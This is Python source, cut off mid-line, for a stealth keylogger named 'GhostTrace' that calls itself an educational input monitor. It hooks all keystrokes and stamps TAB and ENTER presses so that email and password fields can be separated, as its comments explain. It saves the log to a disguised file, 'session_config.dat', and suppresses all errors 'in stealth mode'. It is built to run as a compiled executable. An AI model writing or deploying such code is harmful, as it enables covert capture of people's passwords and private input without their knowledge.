"""
Project: GhostTrace (Educational Input Monitor)
Author: Simone Ethan Alapens
Version: 1.0.5-STEALTH
Description: A lightweight system hook for educational purposes.
"""

import pynput.keyboard
import os
import time
import sys
import ctypes

# --- 1. DYNAMIC PATH CONFIGURATION ---
# Works both as a .py script and as a compiled .exe
if getattr(sys, 'frozen', False):
    # Running as a compiled bundle (PyInstaller)
    base_dir = os.path.dirname(sys.executable)
else:
    # Running as a standard Python script
    base_dir = os.path.dirname(os.path.abspath(__file__))

# The log file is saved in the same folder as the program
LOG_PATH = os.path.join(base_dir, "session_config.dat")

# --- 2. SIGNATURE & EASTER EGG ---
__author__ = "Simone Ethan Alapens"
SECRET_SEQUENCE = "simoneethanalapens"
recent_input = ""

# --- 3. STORAGE LOGIC ---
keystroke_buffer = []
BUFFER_THRESHOLD = 25  # Save to disk every 25 characters

def trigger_easter_egg():
    """Reveals the author's identity using the native Windows API."""
    try:
        # 0x40 = Blue Information Icon
        ctypes.windll.user32.MessageBoxW(0, f"GhostTrace Protocol\nAuthor: {__author__}\nStatus: Active", "System Audit", 0x40)
    except:
        pass

def save_to_disk():
    """Writes the buffer to disk and forces a hardware sync."""
    global keystroke_buffer
    if not keystroke_buffer:
        return
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write("".join(keystroke_buffer))
            f.flush()            # Flush internal buffer to OS
            os.fsync(f.fileno())  # Force OS to write to physical disk
        keystroke_buffer.clear()
    except Exception:
        pass # Absolute silence in stealth mode

def on_press(key):
    global keystroke_buffer, recent_input
    try:
        # Capture standard characters (letters, numbers, symbols)
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            keystroke_buffer.append(char)
            
            # --- EASTER EGG LOGIC ---
            # Tracks the last 30 characters typed
            recent_input = (recent_input + char.lower())[-30:]
            if SECRET_SEQUENCE in recent_input:
                trigger_easter_egg()
                recent_input = "" # Reset after trigger
            
        else:
            # Capture special keys
            if key == pynput.keyboard.Key.space:
                keystroke_buffer.append(" ")
                
            # TAB and ENTER: Key moments to separate fields (e.g., Email -> Pass)
            elif key in [pynput.keyboard.Key.tab, pynput.keyboard.Key.enter]:
                key_type = "TAB" if key == pynput.keyboard.Key.tab else "ENTER"
                timestamp = time.strftime("%H:%M:%S")
                keystroke_buffer.append(f"\n--- [{key_type} @ {timestamp}] ---\n")
                save_to_disk() # Save immediately on focus change
                
            elif key == pynput.keyboard.Key.backspace:
                keystroke_buffer.append("[BACKSPACE]")

        # Periodic auto-save if buffer limit is reached
        if len(keystroke_buffer) >= BUFFER_THRESHOLD:
            save_to_disk()
            
    except Exception:
        pass

# --- 4. LISTENER INITIALIZATION ---
# The listener runs in a background thread and hooks system interrupts
with pyn
